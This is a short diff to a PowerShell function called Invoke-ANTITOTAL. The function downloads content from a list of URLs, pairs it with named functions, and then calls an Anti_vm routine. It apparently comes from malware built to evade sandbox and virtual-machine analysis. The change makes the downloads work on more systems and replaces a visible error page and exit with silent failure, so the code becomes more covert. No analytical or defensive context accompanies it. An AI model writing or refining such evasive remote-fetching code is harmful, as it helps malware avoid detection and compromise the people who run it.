@@ -46,7 +46,7 @@ function Invoke-ANTITOTAL {
         $url = $urls[$i]
         $functionName = $functions[$i]
         
-        $result = Invoke-WebRequest -Uri $url
+        $result = Invoke-WebRequest -Uri $url -UseBasicParsing
         if ($result.StatusCode -eq 200) {
             $content = $result.Content
             $function = Get-Command -Name $functionName
@@ -59,8 +59,7 @@ function Invoke-ANTITOTAL {
             }
         }
         else {
-            make_error_page "Failed to retrieve content from URL: $url"
-            exit
+            ""
         }
     }
     Anti_vm
